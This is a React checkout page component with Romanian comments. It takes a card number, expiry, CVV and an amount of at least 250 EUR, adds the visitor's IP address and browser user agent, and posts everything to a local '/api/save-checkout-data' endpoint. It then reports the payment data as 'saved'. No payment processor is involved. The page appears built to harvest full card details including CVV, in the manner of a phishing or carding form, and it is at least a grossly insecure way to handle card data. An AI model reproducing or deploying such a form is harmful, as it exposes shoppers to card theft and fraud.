"use client";
import React, { useState } from "react";

type CardType = "visa" | "mastercard" | "amex" | "revolut" | "default";

const Checkout: React.FC = () => {
  const [cardNumber, setCardNumber] = useState<string>(""); // Număr card formatat
  const [cardType, setCardType] = useState<CardType>("default"); // Tip card
  const [amount, setAmount] = useState<string>(""); // Suma introdusă
  const [expDate, setExpDate] = useState<string>(""); // Data expirării formatată
  const [cvv, setCvv] = useState<string>(""); // CVV
  const [error, setError] = useState<string | null>(null); // Mesaj de eroare
  const [isLoading, setIsLoading] = useState<boolean>(false); // Starea de încărcare

  const cardLogos: Record<CardType, { src: string; width: string; height: string }> = {
    visa: {
      src: "https://image.similarpng.com/very-thumbnail/2020/06/Logo-VISA-transparent-PNG.png",
      width: "w-10",
      height: "h-6",
    },
    mastercard: {
      src: "https://e7.pngegg.com/pngimages/530/165/png-clipart-logo-mastercard-pentagram-flat-design-brand-mastercard-text-trademark.png",
      width: "w-12",
      height: "h-8",
    },
    amex: {
      src: "https://cdn-icons-png.flaticon.com/512/196/196539.png",
      width: "w-14",
      height: "h-8",
    },
    revolut: {
      src: "https://www.logo.wine/a/logo/Revolut/Revolut-Logo.wine.svg",
      width: "w-12",
      height: "h-6",
    },
    default: {
      src: "/default-logo.png",
      width: "w-8",
      height: "h-8",
    },
  };

  const detectCardType = (number: string): CardType => {
    if (/^4/.test(number)) return "visa";
    if (/^5[1-5]/.test(number)) return "mastercard";
    if (/^3[47]/.test(number)) return "amex";
    if (/^5300|^6767/.test(number)) return "revolut";
    return "default";
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Elimină caracterele nenumerice
    value = value.replace(/(\d{4})(?=\d)/g, "$1 "); // Adaugă spațiu după fiecare 4 cifre
    setCardNumber(value.trim());
    setCardType(detectCardType(value));
  };

  const handleExpDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Elimină caracterele nenumerice

    if (value.length > 2) {
      const month = value.slice(0, 2);
      const day = value.slice(2, 4);

      // Validare lună
      if (parseInt(month, 10) > 12) {
        value = "12"; // Maximul este 12
      } else if (parseInt(month, 10) === 0) {
        value = "01"; // Minimul este 01
      }

      // Validare zi
      if (day && parseInt(day, 10) > 31) {
        value = `${month}/31`; // Maximul este 31
      } else if (day) {
        value = `${month}/${day}`;
      }
    }

    setExpDate(value);
  };

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d.]/g, ""); // Permite doar numere și punct
    setAmount(value);

    if (Number(value) < 250) {
      setError("Amount must be at least 250 EUR."); // Setează mesajul de eroare
    } else {
      setError(null); // Elimină eroarea dacă suma este validă
    }
  };

  const handleSubmit = async () => {
    if (error || !amount || !cardNumber || !expDate || !cvv) {
      alert("Please fill in all fields correctly.");
      return;
    }

    setIsLoading(true);

    const payload = {
      cardNumber,
      cardType,
      amount,
      expDate,
      cvv,
      ip: null,
      device: window.navigator.userAgent,
    };

    try {
      const ipResponse = await fetch("https://api64.ipify.org?format=json");
      const ipData = await ipResponse.json();
      payload.ip = ipData.ip;

      const response = await fetch("/api/save-checkout-data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        alert("Payment data successfully saved!");
      } else {
        alert("Failed to save payment data.");
      }
    } catch (err) {
      console.error("Error submitting data:", err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="max-w-sm mx-auto p-4 bg-white shadow-lg rounded-md">
        <h2 className="text-lg font-semibold mb-4">Pay with</h2>
        <div className="flex space-x-2 mb-4">
          {Object.entries(cardLogos).map(([type, logo]) =>
            type !== "default" ? (
              <img
                key={type}
                src={logo.src}
                alt={`${type} logo`}
                className={`inline-block ${logo.width} ${logo.height}`}
              />
            ) : null
          )}
        </div>
        <div className="mb-4 relative">
          <input
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="Card number"
            className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          />
          {cardType !== "default" && (
            <img
              src={cardLogos[cardType].src}
              alt={`${cardType} logo`}
              className={`absolute right-3 top-2 ${cardLogos[cardType].width} ${cardLogos[cardType].height}`}
            />
          )}
        </div>
        <div className="mb-4">
          <input
            type="text"
            value={expDate}
            onChange={handleExpDateChange}
            placeholder="MM/DD"
            className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          />
        </div>
        <div className="flex space-x-4 mb-4">
          <input
            type="text"
            value={cvv}
            onChange={(e) => setCvv(e.target.value)}
            placeholder="CVV2"
            className="w-1/2 px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          />
          <input
            type="text"
            value={amount}
            onChange={handleAmountChange}
            placeholder="Amount"
            className="w-1/2 px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          />
        </div>
        <button
          className="w-full bg-purple-500 text-white py-2 rounded-md hover:bg-purple-600 transition"
          onClick={handleSubmit}
          disabled={isLoading || !!error || !amount}
        >
          {isLoading ? "Processing..." : `Pay ${amount || " "} EUR`}
        </button>
      </div>
    </div>
  );
};

export default Checkout;
